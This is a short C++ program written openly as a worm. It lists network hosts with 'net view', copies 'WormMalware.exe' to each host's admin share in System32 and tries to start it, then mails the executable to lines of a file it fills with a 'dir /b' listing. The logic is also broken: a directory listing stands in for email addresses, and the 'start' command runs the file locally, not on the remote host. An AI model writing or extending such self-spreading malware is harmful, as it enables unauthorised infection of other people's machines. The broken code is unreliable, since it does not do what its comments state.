#include <iostream>
#include <string>
#include <fstream>
#include <windows.h>

using namespace std;

void spreadThroughNetwork()
{
	// Get the list of computers on the network
	string command = "net view > computers.txt";
	system(command.c_str());

	// Open the file containing the list of computers
	ifstream file("computers.txt");
	string line;

	// Loop through each computer in the list
	while (getline(file, line))
	{
		// Copy the malware program to the remote computer
		string copyCommand = "copy WormMalware.exe \\\\" + line + "\\c$\\Windows\\System32\\";
		system(copyCommand.c_str());

		// Execute the malware program on the remote computer
		string executeCommand = "start \\\\" + line + "\\c$\\Windows\\System32\\WormMalware.exe";
		system(executeCommand.c_str());
	}
}

void spreadThroughEmail()
{
	// Get the list of email addresses
	string command = "dir /b > emails.txt";
	system(command.c_str());

	// Open the file containing the list of email addresses
	ifstream file("emails.txt");
	string line;

	// Loop through each email address in the list
	while (getline(file, line))
	{
		// Send the malware program to the email address
		string sendCommand = "sendmail " + line + " WormMalware.exe";
		system(sendCommand.c_str());
	}
}

int main()
{
	spreadThroughNetwork();
	spreadThroughEmail();

	return 0;
}